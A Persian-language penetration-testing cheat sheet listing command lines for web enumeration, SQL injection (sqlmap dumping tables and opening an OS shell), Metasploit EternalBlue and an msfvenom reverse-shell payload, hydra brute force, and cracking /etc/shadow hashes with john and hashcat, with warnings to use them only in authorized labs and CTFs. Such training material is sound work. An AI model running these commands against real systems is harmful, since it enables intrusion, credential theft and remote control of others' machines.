بخش ۳ — وب، اکسپلویت و کرک

از پیدا کردن مسیر مخفی تا شل گرفتن و شکستن هش — قلب عملیاتی تست نفوذ.

gobuster / dirbکشف دایرکتوری‌های مخفی

gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,bak
dirb http://10.10.10.5 /usr/share/wordlists/dirb/common.txt
# ساب‌دامنه:
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million.txt
💡 ساب‌دامنه و مسیرهای یافت‌شده را در یادداشت پروژه ثبت کنید؛ زنجیره اکسپلویت اغلب از اینجا شروع می‌شود.

Burp Suiteمشاهده و بازپخش درخواست‌ها

مرورگر آزمایش را از پروکسی محلی عبور دهید، درخواست را در HTTP history پیدا کنید و فقط روی هدف مجاز بازپخش کنید.

burpsuite
# پراکسی پیش‌فرض: 127.0.0.1:8080
# برای ابزار خط فرمان:
curl -x http://127.0.0.1:8080 http://10.10.10.5/
💡 برای HTTPS در لابراتوار، گواهی CA خود Burp را فقط در پروفایل مرورگر آزمایش نصب کنید؛ نه در مرورگر روزمره.

ffufکشف محتوای سریع و کنترل‌شده

ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://10.10.10.5/FUZZ -w words.txt -mc 200,204,301,302,307,401,403 -rate 20
ffuf -u http://10.10.10.5/ -H 'Host: FUZZ.example.test' -w subdomains.txt -fs 0

-rate را با ظرفیت محیط هماهنگ کنید و پاسخ‌های مشابه را با اندازه یا کد فیلتر کنید.

niktoاسکنر آسیب‌پذیری وب

nikto -h http://10.10.10.5
nikto -h http://10.10.10.5 -o nikto.html -Format html
nikto -h https://example.com -ssl -Tuning 123b   # فقط تست‌های منتخب

wpscanاسکنر اختصاصی WordPress

wpscan --url http://10.10.10.5/wp --enumerate ap,at,cb,dbe
wpscan --url http://10.10.10.5/wp -U admin -P /usr/share/wordlists/rockyou.txt

sqlmapتزریق SQL خودکار

# اول درخواست را در Burp بگیرید، سپس:
sqlmap -u "http://10.10.10.5/item.php?id=1" --batch --dbs
sqlmap -r request.txt --batch --dbs          # از فایل درخواست
sqlmap -u "..." -D webapp -T users --dump
sqlmap -u "..." --os-shell                    # شل (فقط با مجوز!)
⚠️ sqlmap روی سیستم‌های بدون مجوز غیرقانونی است؛ در CTF و lab استفاده کنید.

searchsploitجست‌وجوی اکسپلویت در Exploit-DB

searchsploit apache 2.4.49
searchsploit --id "remote code execution" wordpress
searchsploit -m 49384       # کپی اکسپلویت به پوشه فعلی

msfconsoleMetasploit — چارچوب اکسپلویت

sudo systemctl start postgresql && msfdb init   # فقط بار اول
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.5
set LHOST tun0
run
# بعد از شل:
sessions -l
sessions -i 1
# تولید payload مستقل:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o rev.elf
💡 در CTFها اغلب شل ساده کافی است؛ Metasploit برای زنجیره‌های پیچیده‌تر و post-exploitation است.

hydraحمله بروت‌فورس به سرویس‌ها

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5 -t 4
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Wrong"
hydra -L users.txt -P passes.txt ftp://10.10.10.5

johnکرک هش با CPU

unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
zip2john secret.zip > ziphash.txt && john ziphash.txt

hashcatکرک هش با GPU — بسیار سریع‌تر

hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # sha512crypt
hashcat -m 1000 hash.txt rockyou.txt    # NTLM
hashcat -m 0 hash.txt rockyou.txt       # MD5
hashcat -m 0 hash.txt --show
hashcat --example-hashes | less          # لیست همه مدها
📚 کتابخانه‌های کلیدی: /usr/share/wordlists/rockyou.txt (قبل از استفاده: gunzip کنید) و /usr/share/seclists/.
